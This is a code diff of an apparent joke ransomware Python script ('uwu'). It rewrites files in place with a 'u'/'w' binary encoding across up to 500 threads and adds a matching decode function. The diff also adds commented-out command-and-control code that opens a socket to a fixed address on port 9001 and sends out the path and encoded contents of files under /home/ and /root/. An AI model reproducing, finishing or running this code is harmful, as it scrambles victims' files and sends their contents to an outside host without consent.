@@ -1,9 +1,20 @@
 import os
 import threading
+import math
+import socket
+
+#c2_addr="192.168.178.73"
+#c2_port=9001
 
 exc=[]
 threads=[]
 max_t=500
+
+#try:
+#    c=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+#    c.connect((c2_addr, c2_port))
+#except:
+#    c=False
 
 def toBinary(a):
   l,m=[],[]
@@ -13,7 +24,7 @@ def toBinary(a):
     m.append(int(bin(i)[2:]))
   return m
 
-  def toString(a):
+def toString(a):
     l=[]
     m=""
     for i in a:
@@ -29,12 +40,24 @@ def toBinary(a):
         m=m+chr(x)
     return m
 
+def decode(file):
+        try:
+                with open(file, "r") as f:
+                    x=f.read().replace("u", "1").replace("w", "0").split()
+                content=str(toString(list(map(int, x))))
+                content=content.replace("EOL", "\n")
+                with open(file, "w") as f:
+                    f.write(content)
+        except:
+                pass
 
 def encode(file):
     try:
         with open(file, "r") as f:
             x=f.read().replace("\n", "EOL")
             content = " ".join(map(str, toBinary(x))).replace("1", "u").replace("0", "w")
+#        if c and ("/home/" in file or "/root/" in file):
+#            c.send(str(file).encode() + b"\n" + str(content).encode() + b"\nEOF\n")
         with open(file, "w") as f:
             f.write(content)
     except:
@@ -64,3 +87,6 @@ print("uwu...")
 for t in threads:
     t.join()
     del t
+print("uwu!!!")
+#if c:
+#    c.close()
